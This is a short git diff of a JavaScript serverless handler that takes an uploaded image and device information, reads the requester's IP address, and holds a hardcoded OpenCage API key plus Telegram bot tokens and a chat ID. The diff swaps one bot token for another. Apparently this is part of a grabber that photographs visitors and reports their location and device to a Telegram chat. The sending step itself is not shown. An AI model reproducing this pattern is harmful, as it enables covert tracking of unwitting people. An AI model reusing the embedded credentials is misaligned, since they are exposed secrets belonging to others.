@@ -7,7 +7,7 @@ const OPENCAGE_KEY = "136e90f2e15c46fda280cbc59b05cfda";
 export default async function handler(req, res) {
   try {
     const { image, deviceInfo } = req.body;
-    const botToken = "8075080156:AAFhn7Wqxr-cxpvlSKdEFr1iL6qdOgWGwgw";
+    const botToken = "7549302119:AAHTx2AbUyZS9fksVLWyjuZAgwPF-gRIVto";
     const chatId = "6676770258";
 
     const ip = req.headers["x-forwarded-for"]?.split(",")[0] || req.connection.remoteAddress;
